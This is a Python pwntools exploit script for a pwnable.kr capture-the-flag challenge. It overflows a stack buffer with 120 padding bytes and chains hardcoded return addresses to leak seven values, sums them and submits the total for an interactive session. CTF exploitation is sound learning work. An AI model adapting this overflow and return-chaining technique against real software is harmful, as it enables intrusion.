from pwn import *
import ctypes, re

p = remote('pwnable.kr',10016)
# context.log_level='debug'

'''
Arch:       i386-32-little
RELRO:      Full RELRO
Stack:      No canary found  # BOF
NX:         NX enabled
PIE:        No PIE (0x8040000) # Static address
Stripped:   No
'''
p.recvuntil(b'Select Menu:')
p.sendline(b'0')
p.recvuntil(b'How many EXP did you earned?')
p.sendline(b'A'*120+p32(0x0804129d)+p32(0x080412cf)+p32(0x08041301)+p32(0x08041333)+p32(0x08041365)+p32(0x08041397)+p32(0x080413c9)+p32(0x0804150b))
sums = 0

for _ in range(7):
  d = p.recvuntil(b'You found') and p.recvline()
  d = re.search(rb'\(EXP \+?(-?\d+)\)',d)[1]
  sums += int(d)
  print('GOT NUMBER', int(d))

total=ctypes.c_int32(sums).value
print('TOTAL',total)

p.sendlineafter(b'Select Menu:', b'0')
p.sendlineafter(b'How many EXP did you earned? :', b'%d' % total)
p.interactive()